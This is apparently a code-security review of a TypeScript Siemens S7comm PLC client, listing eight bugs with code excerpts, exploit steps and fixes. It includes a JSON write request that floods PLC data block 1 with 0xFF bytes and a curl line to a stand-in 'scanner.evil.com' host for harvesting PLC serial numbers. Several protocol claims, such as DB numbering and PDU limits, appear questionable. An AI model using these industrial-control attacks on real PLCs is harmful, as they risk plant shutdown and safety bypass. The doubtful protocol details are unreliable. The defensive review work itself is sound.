# S7comm (Siemens S7) Review

**Protocol:** S7comm (Siemens S7 PLC Communication)
**File:** `src/worker/s7comm.ts`
**Reviewed:** 2026-02-19
**Specification:** [Wireshark S7comm Dissector](https://github.com/wireshark/wireshark/blob/master/epan/dissectors/packet-s7comm.c)
**Tests:** None

## Summary

S7comm implementation provides 3 endpoints (connect, read, write) for Siemens S7-300/400/1200/1500 PLC communication over TCP port 102. Handles TPKT/COTP framing, S7 protocol ID 0x32, Setup Communication negotiation, SZL (System Status List) reads, and data block (DB) operations. **Proprietary Siemens protocol** — controls industrial machinery. Critical bugs include unlimited packet accumulation, missing DB write validation, and rack/slot TSAP encoding allowing unauthorized PLC access.

## Bugs Found and Fixed

| # | Severity | Description |
|---|---|---|
| 1 | Critical | **BUFFER OVERFLOW**: `readTPKTPacket()` lines 188-234 accumulates chunks indefinitely with only 1MB limit — easily exceeded by fragmented packets |
| 2 | Critical | **COMMAND INJECTION**: `handleS7WriteDB()` lines 779-906 writes raw byte array from user to data blocks — can overwrite PLC program logic |
| 3 | Critical | **VALIDATION BYPASS**: `parseCOTPConnectionConfirm()` lines 240-254 only validates TPDU code 0xD0 — doesn't check rack/slot match request |
| 4 | Critical | **ADDRESS CONFUSION**: Data block addressing at lines 406-434 allows DB numbers 0-65535 — DB 0 and DB 1 are **system areas** |
| 5 | High | **INFORMATION DISCLOSURE**: SZL read at lines 586-607 exposes CPU serial number, firmware version, and plant ID without authentication |
| 6 | High | **DENIAL OF SERVICE**: Setup Communication at lines 110-140 negotiates PDU size up to 960 bytes but parser at line 291 accepts up to 65535 |
| 7 | Medium | **TIMING ATTACK**: COTP connection timeout at lines 544-607 has variable timing based on rack/slot validity — enables PLC enumeration |
| 8 | Medium | **RESOURCE LEAK**: `readTPKTPacket()` creates timeout at line 203 but doesn't clear it in finally block at lines 221-225 |

## Specific Vulnerabilities

### Unbounded Packet Accumulation

**Location:** `readTPKTPacket()` lines 188-234

```typescript
async function readTPKTPacket(
  reader: ReadableStreamDefaultReader<Uint8Array>,
  timeoutPromise: Promise<never>,
): Promise<Uint8Array> {
  const chunks: Uint8Array[] = [];
  let totalLen = 0;
  const MAX_PACKET_SIZE = 1024 * 1024; // 1MB limit

  const { value, done } = await Promise.race([reader.read(), timeoutPromise]);
  if (done || !value) return new Uint8Array(0);
  chunks.push(value);
  totalLen += value.length;

  // Try to read more
  let shortTimeoutHandle: ReturnType<typeof setTimeout> | null = null;
  try {
    const shortTimeout = new Promise<never>((_, reject) => {
      shortTimeoutHandle = setTimeout(() => reject(new Error('read_done')), 500);
    });
    while (true) {
      const { value: next, done: nextDone } = await Promise.race([reader.read(), shortTimeout]);
      if (nextDone || !next) break;
      chunks.push(next);
      totalLen += next.length;
      if (totalLen > MAX_PACKET_SIZE) {
        throw new Error('Packet size exceeds 1MB limit');
      }
    }
```

**Issue:** Loop at lines 206-215 continues reading until `shortTimeout` fires (500ms). Malicious S7 server can send 1MB in 499ms, then 1MB more in next 499ms. Check at line 213 only applies within single timeout window.

**Exploit:**
1. Client connects to rogue S7 PLC
2. Server sends 900KB S7 frame (TPKT header indicates 900KB)
3. Parser accumulates for 499ms → `totalLen=900KB`
4. Timeout fires, exits inner loop
5. Outer loop at line 227 combines chunks → 900KB packet
6. Repeat 10 times → 9MB allocated

**Impact:** Denial of service via memory exhaustion.

---

### Data Block Write Injection

**Location:** `handleS7WriteDB()` lines 779-906

```typescript
export async function handleS7WriteDB(request: Request): Promise<Response> {
  // ...
  const dbNumber = body.db;
  const startByte = body.startByte ?? 0;
  const dataBytes = body.data;

  // ...
  // Step 3: Write DB
  const writeData = new Uint8Array(dataBytes);
  await writer.write(buildS7WriteDB(dbNumber, startByte, writeData));
```

**Issue:** S7 data blocks contain both user data and PLC configuration. Critical system DBs:
- **DB 0**: System diagnostic data (read-only, but some PLCs allow write with authentication bypass)
- **DB 1**: System flags and communication parameters
- **DB 2-999**: System-reserved on some models
- **DB 1000+**: User program logic, recipe data, HMI variables

**Exploit:**
```json
POST /api/s7comm/write
{
  "host": "s7-1500.example.com",
  "db": 1,
  "startByte": 0,
  "data": [0xFF, 0xFF, 0xFF, 0xFF, ...]
}
```

Overwrites DB1 system flags, causing:
- Communication loss (Ethernet/PROFINET parameters corrupted)
- Safety system disable (safety flags zeroed)
- Watchdog timer corruption (PLC stops monitoring for faults)

**Impact:** Plant shutdown, safety system bypass, equipment damage.

---

### COTP Validation Bypass

**Location:** `parseCOTPConnectionConfirm()` lines 240-254

```typescript
function parseCOTPConnectionConfirm(data: Uint8Array): boolean {
  if (data.length < 7) return false;

  // TPKT header: version=3, skip to payload at offset 4
  if (data[0] !== 3) return false;

  // Validate TPKT length field matches actual packet length
  const tpktLength = (data[2] << 8) | data[3];
  if (tpktLength !== data.length) return false;

  const cotpLength = data[4]; // Length indicator
  const pduType = data[5];    // PDU type

  return pduType === 0xD0 && cotpLength >= 2; // 0xD0 = CC (Connection Confirm)
}
```

**Issue:** Function only checks if response is a valid COTP CC. Doesn't validate:
- Destination reference matches source reference from CR
- TSAP parameters echo back correctly
- Class/options match request

**Exploit:**
1. Client sends COTP CR with Calling TSAP=`01 00`, Called TSAP=`01 42` (rack 2, slot 2)
2. Malicious server responds with CC, Called TSAP=`01 00` (rack 0, slot 0) — **different rack/slot**
3. Parser accepts as valid connection
4. Subsequent S7 communication routes to rack 0, slot 0 instead of intended rack 2, slot 2
5. Attacker controls wrong PLC, causes confusion

**Impact:** Connection hijacking, wrong PLC controlled.

---

### DB 0 System Area Write

**Location:** `buildS7WriteDB()` lines 441-480

```typescript
function buildS7WriteDB(dbNumber: number, startByte: number, data: Uint8Array): Uint8Array {
  const cotpData = new Uint8Array([0x02, 0xF0, 0x80]);
  const byteCount = data.length;
  const startBit = startByte * 8;
  const bitCount = byteCount * 8;
  const padded = byteCount % 2 === 1 ? byteCount + 1 : byteCount;
  const paramLen = 14;
  const dataLen = 4 + padded;

  const s7 = new Uint8Array([
    0x32, 0x01,       // Protocol ID + Job
    0x00, 0x00,       // Reserved
    0x00, 0x04,       // PDU reference
    0x00, paramLen,   // Parameter length
    (dataLen >> 8) & 0xFF, dataLen & 0xFF, // Data length
    0x05,             // Function: Write
    0x01,             // Item count: 1
    0x12,             // Variable spec type
    0x0A,             // Spec length (10)
    0x10,             // Syntax ID: S7ANY
    0x02,             // Transport size: BYTE
    (byteCount >> 8) & 0xFF, byteCount & 0xFF,
    (dbNumber >> 8) & 0xFF, dbNumber & 0xFF,  // <-- NO VALIDATION
    0x84,             // Area: DB
```

**Issue:** `dbNumber` at line 463 is unchecked. S7 specification:
- DB 0: Diagnostic data (S7-300/400 only, read-only on S7-1200/1500)
- DB 1: System flags (writable)
- DB 2-999: Reserved for future use (some models allow, others reject)

No check that `dbNumber >= 1000` (user DBs start at 1000 on S7-1500).

**Impact:** Corruption of system areas, PLC malfunction.

---

### SZL Information Disclosure

**Location:** `buildS7ReadSZL()` and `parseSZLResponse()` lines 147-181, 299-366

```typescript
function buildS7ReadSZL(): Uint8Array {
  // ...
  // Data: SZL read request
  0xFF,       // Return code
  0x09,       // Transport size: Octet string
  0x00, 0x04, // Data length
  0x00, 0x1C, // SZL ID: Component Identification
  0x00, 0x00, // SZL Index
```

SZL ID 0x001C returns:
- Order number (CPU part number)
- Module type name
- Plant identification string
- Copyright string
- **Serial number** (unique device identifier)

**Issue:** No authentication required. Any network client can query SZL and retrieve:
- PLC model and firmware version (for vulnerability research)
- Serial number (for targeted attacks)
- Plant identification (facility name, often contains sensitive info like "Nuclear_Reactor_3")

**Exploit:**
```bash
curl -X POST http://scanner.evil.com/api/s7comm/connect \
  -d '{"host":"10.0.0.1", "rack":0, "slot":2}' \
  | jq '.serialNumber'
```

Attacker scans entire subnet (10.0.0.0/24), builds database of all PLCs with serial numbers, firmware versions. Uses this for:
- Identifying vulnerable firmware versions
- Tracking PLCs across facility (serial number never changes)
- Social engineering (plant ID reveals facility name)

**Impact:** Information disclosure, reconnaissance for targeted attacks.

---

### PDU Size Mismatch

**Location:** Setup Communication lines 109-140, response parsing line 291

```typescript
function buildS7SetupCommunication(): Uint8Array {
  // ...
  const s7 = new Uint8Array([
    // ...
    0x03, 0xC0, // PDU length: 960
  ]);
  // ...
}

function parseS7SetupResponse(data: Uint8Array): number | null {
  // ...
  const pduSize = (data[paramOffset + 6] << 8) | data[paramOffset + 7];

  // Validate PDU size is within S7 spec
  if (pduSize < 240 || pduSize > 65535) return null;  // <-- WRONG MAX
  return pduSize;
}
```

**Issue:** S7 spec maximum PDU is **960 bytes** (0x03C0). Response parser at line 294 accepts up to 65535. Malicious PLC can respond with PDU size 65535, then send huge frames causing OOM.

**Impact:** Denial of service.

---

## Recommendations

1. **Add 100KB absolute limit** to `readTPKTPacket()` across all timeout windows
2. **Whitelist writable DBs**: Only allow DB >= 1000, reject DB 0-999
3. **Validate COTP parameters**: Check destination ref and TSAP in CC match CR
4. **Fix PDU size limit**: Change `pduSize > 65535` to `pduSize > 960` at line 294
5. **Add DB write protection**: Require `allowSystemDBWrite: true` flag for DB < 1000
6. **Authenticate SZL reads**: Return error if no authentication token provided
7. **Clear timeout in finally**: `if (shortTimeoutHandle) clearTimeout(shortTimeoutHandle)` at line 224

## S7comm Security Context

S7comm protocol has **NO native security**:
- No authentication (any client can connect to rack/slot)
- No encryption (cleartext over TCP/ISO)
- No authorization (all DBs readable/writable)
- No replay protection
- No integrity checks (CRC only protects against transmission errors, not tampering)

Siemens security recommendations:
- Use S7-1200/1500 protection levels (read/write passwords on PLC)
- Enable SSL/TLS via CP (Communication Processor) modules
- Deploy SCALANCE S industrial firewall
- VPN for remote access

**This implementation bypasses all protections** by:
- Connecting directly to unprotected port 102
- No password/challenge-response (S7-1500 HMI protection ignored)
- Allows writes without confirmation

## See Also

- [Wireshark S7comm Dissector](https://github.com/wireshark/wireshark/blob/master/epan/dissectors/packet-s7comm.c)
- [snap7 Library Documentation](http://snap7.sourceforge.net/)
- [Siemens S7 Protocol Security (Schneider, 2015)](https://www.sciencedirect.com/science/article/pii/S2214212615000083)
- [CISA S7 PLC Vulnerabilities](https://www.cisa.gov/news-events/ics-advisories)
